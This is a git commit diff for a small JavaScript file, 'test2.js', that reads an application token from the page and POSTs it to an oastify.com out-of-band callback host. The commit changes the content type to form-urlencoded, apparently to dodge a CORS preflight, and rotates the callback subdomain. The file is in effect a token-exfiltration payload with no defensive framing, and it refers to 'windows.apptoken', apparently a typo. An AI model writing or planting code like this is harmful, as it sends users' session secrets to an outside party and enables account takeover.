81e7f22eb6fe9ad847e4e0d5230dd81a3fca492c
Richard Haaga <richard.haaga@gmail.com>
2023-10-21 11:45:57 +0200

    Update test2.js

--- test2.js
+++ test2.js
@@ -2,8 +2,8 @@ var apptoken = windows.apptoken;
 
 const requestOptions = {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: JSON.stringify({ token: apptoken })
 };
-fetch('https://q3uz5uffubu7mt9ntzz67yeaf1ls9pxe.oastify.com/test2', requestOptions)
+fetch('https://av9jxe7zmvmred17ljrqzi6u7ldc1ep3.oastify.com/test2', requestOptions)
     .then(response => response.json())
